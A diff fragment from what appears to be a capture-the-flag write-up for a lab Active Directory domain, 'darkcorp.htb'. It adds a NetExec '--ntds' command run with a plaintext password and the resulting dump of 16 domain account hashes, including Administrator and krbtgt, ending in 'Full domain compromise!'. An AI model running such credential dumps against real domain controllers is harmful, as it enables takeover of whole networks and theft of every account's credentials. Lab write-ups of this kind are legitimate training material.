@@ -1392,9 +1392,29 @@ User Policy update has completed successfully.
 Ill update the policy
 
 ```python
-nxc smb dc-01.darkcorp.htb -u john -p 'H4x00r123..'  
+nxc smb dc-01.darkcorp.htb -u john -p 'H4x00r123..' --ntds
 SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
 SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\john:H4x00r123.. (Pwn3d!)
+SMB         172.16.20.1     445    DC-01            [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         172.16.20.1     445    DC-01            Administrator:500:aad3b435b51404eeaad3b435b51404ee:fcb3ca5a19a1ccf2d14c13e8b64cde0f:::
+SMB         172.16.20.1     445    DC-01            Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         172.16.20.1     445    DC-01            krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7c032c3e2657f4554bc7af108bd5ef17:::
+SMB         172.16.20.1     445    DC-01            victor.r:1103:aad3b435b51404eeaad3b435b51404ee:06207752633f7509f8e2e0d82e838699:::
+SMB         172.16.20.1     445    DC-01            svc_acc:1104:aad3b435b51404eeaad3b435b51404ee:01f55ea10774cce781a1b172478fcd25:::
+SMB         172.16.20.1     445    DC-01            john.w:1105:aad3b435b51404eeaad3b435b51404ee:b31090fdd33a4044cd815558c4d05b04:::
+SMB         172.16.20.1     445    DC-01            angela.w:1106:aad3b435b51404eeaad3b435b51404ee:957246c8137069bca672dc6aa0af7c7a:::
+SMB         172.16.20.1     445    DC-01            angela.w.adm:1107:aad3b435b51404eeaad3b435b51404ee:cf8b05d0462fc44eb783e3f423e2a138:::
+SMB         172.16.20.1     445    DC-01            taylor.b:1108:aad3b435b51404eeaad3b435b51404ee:ab32e2ad1f05dab03ee4b4d61fcb84ab:::
+SMB         172.16.20.1     445    DC-01            taylor.b.adm:14101:aad3b435b51404eeaad3b435b51404ee:0577b4b3fb172659dbac0be4554610f8:::
+SMB         172.16.20.1     445    DC-01            darkcorp.htb\eugene.b:25601:aad3b435b51404eeaad3b435b51404ee:84d9acc39d242f951f136a433328cf83:::
+SMB         172.16.20.1     445    DC-01            darkcorp.htb\bryce.c:25603:aad3b435b51404eeaad3b435b51404ee:5aa8484c54101e32418a533ad956ca60:::
+SMB         172.16.20.1     445    DC-01            john:33601:aad3b435b51404eeaad3b435b51404ee:98da674948a73eb2cfa124e9aca27a03:::
+SMB         172.16.20.1     445    DC-01            DC-01$:1000:aad3b435b51404eeaad3b435b51404ee:45d397447e9d8a8c181655c27ef31d28:::
+SMB         172.16.20.1     445    DC-01            DRIP$:1601:aad3b435b51404eeaad3b435b51404ee:54368cbc18c6785851ec88c118d9fa78:::
+SMB         172.16.20.1     445    DC-01            WEB-01$:20601:aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675:::
+SMB         172.16.20.1     445    DC-01            [+] Dumped 16 NTDS hashes to /home/kali/.nxc/logs/ntds/DC-01_172.16.20.1_2026-09-10_202006.ntds of which 13 were added to the database
+SMB         172.16.20.1     445    DC-01            [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         172.16.20.1     445    DC-01            [*] grep -iv disabled /home/kali/.nxc/logs/ntds/DC-01_172.16.20.1_2026-09-10_202006.ntds | cut -d ':' -f1
 ```
 
 Full domain compromise!
